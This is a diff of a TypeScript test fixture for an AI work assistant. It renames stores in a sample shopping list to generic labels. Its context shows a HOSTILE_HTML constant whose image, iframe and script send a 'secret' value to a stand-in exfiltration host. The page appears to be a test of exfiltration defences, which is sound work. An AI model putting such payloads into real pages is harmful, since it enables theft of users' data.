@@ -250,7 +250,7 @@ const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><me
 <img src="http://exfil.invalid/pixel.png?d=secret" alt=""><iframe src="http://exfil.invalid/frame"></iframe>
 <script>fetch("http://exfil.invalid/script?d=secret");location.href="http://exfil.invalid/navigate?d=secret"</script></body></html>`
 
-const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),IKEA,49\nStorage bins x4,Container Store,36\nDesk lamp,Target,29\nPlant stand,IKEA,19\n"
+const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),Furniture store,49\nStorage bins x4,Home store,36\nDesk lamp,Lighting shop,29\nPlant stand,Furniture store,19\n"
 
 /** Bytes for the files the "artifacts" scenario made, served at /v1/workbot/files/:id. */
 export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string }> = {
